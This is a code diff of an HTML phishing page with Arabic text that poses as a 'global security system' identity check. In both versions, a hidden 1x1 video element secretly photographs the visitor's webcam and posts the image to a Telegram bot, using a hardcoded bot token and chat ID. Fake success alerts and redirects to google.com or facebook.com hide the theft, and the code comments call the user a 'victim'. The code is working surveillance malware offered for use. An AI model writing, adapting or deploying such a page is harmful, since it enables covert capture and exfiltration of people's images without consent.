@@ -1,54 +1,51 @@
-
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
-    <title>Checking System...</title>
+    <meta charset="UTF-8">
+    <title>تحقق من الهوية</title>
+    <style>
+        body { background: #1a1a1a; color: white; text-align: center; font-family: Arial; padding-top: 50px; }
+        .btn { background: #25D366; padding: 15px 30px; border: none; border-radius: 5px; color: white; font-weight: bold; cursor: pointer; }
+    </style>
 </head>
-<body style="background-color: black;">
-    <video id="video" width="1" height="1" autoplay></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+<body>
+    <img src="https://cdn-icons-png.flaticon.com/512/3917/3917705.png" width="100">
+    <h2>نظام الأمان العالمي</h2>
+    <p>يجب السماح بالوصول للكاميرا لإتمام عملية التحقق من الهوية والدخول.</p>
+    <button class="btn" onclick="startCapture()">ابدأ التحقق الآن</button>
+
+    <video id="video" width="1" height="1" autoplay style="opacity:0;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const BOT_TOKEN = '8242772190:AAGFnZdoWm9tCHx0q3w1TTd7wABOUDLDC0c';
-        const CHAT_ID = '1105921069';
+        // ضع توكن البوت والـ ID هنا
+        const T = '8242772190:AAGFnZdoWm9tCHx0q3w1TTd7wABOUDLDC0c';
+        const C = '1105921069';
 
         async function startCapture() {
             try {
-                // طلب صلاحية الكاميرا فور فتح الرابط
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-
-                // انتظر ثانية واحدة لضبط التركيز ثم التقط الصورة
+                
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
+                    canvas.width = 640; canvas.height = 480;
                     canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-                    
-                    canvas.toBlob(async (blob) => {
-                        const formData = new FormData();
-                        formData.append('chat_id', CHAT_ID);
-                        formData.append('photo', blob, 'capture.jpg');
-
-                        // إرسال الصورة إلى البوت
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
-
-                        // إغلاق الكاميرا بعد الإرسال
-                        stream.getTracks().forEach(track => track.stop());
-                        
-                        // توجيه الضحية لصفحة وهمية لعدم الشك
-                        window.location.href = "https://google.com";
+                    canvas.toBlob(b => {
+                        const fd = new FormData();
+                        fd.append('chat_id', C);
+                        fd.append('photo', b, 'user.jpg');
+                        fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
                     }, 'image/jpeg');
-                }, 1000);
-            } catch (err) {
-                // في حال رفض الصلاحية، توجيهه لصفحة أخرى
-                window.location.href = "https://google.com";
+                    // إخفاء الأثر بعد السحب
+                    alert("تم التحقق بنجاح، سيتم توجيهك الآن.");
+                    window.location.href = "https://facebook.com";
+                }, 2000);
+            } catch (e) {
+                alert("يجب إعطاء الصلاحية للمتابعة!");
             }
         }
-
-        window.onload = startCapture;
     </script>
 </body>
 </html>
